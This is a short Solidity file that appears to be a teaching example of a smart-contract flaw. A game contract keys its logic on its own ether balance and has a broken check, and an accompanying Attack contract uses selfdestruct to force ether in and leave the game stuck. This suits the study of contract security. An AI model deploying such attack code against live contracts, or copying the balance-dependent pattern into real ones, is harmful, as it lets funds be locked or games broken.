// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

contract WinnerGame{

    uint256 public constant target = 7 ether;
    address public winner;

    function deposit() public payable{
        require(msg.value==1 ether,"You can only deposit 1 ether");
        uint256 balance = address(this).balance;
        require(balance<target,"Game over");   //when a new user tries to deposit ether, it will
                                                // have balance greater than target always. Hence
                                                // a winner is never set here, making the contract
                                                //inoperable.
        if(balance>=target){
            winner = msg.sender;
        }
    }

    function claimWinnerAmount() public{
        require(msg.sender==winner,"Only Winner can claim");
        (bool sent,) = winner.call{value:address(this).balance}("");
        require(sent,"Transaction failed");
    }
}

contract Attack{

    function attack(address payable game) public payable{
        selfdestruct(game);   //attacker transfers all the remaining target in game's contract
                            // from this contract.
    }
}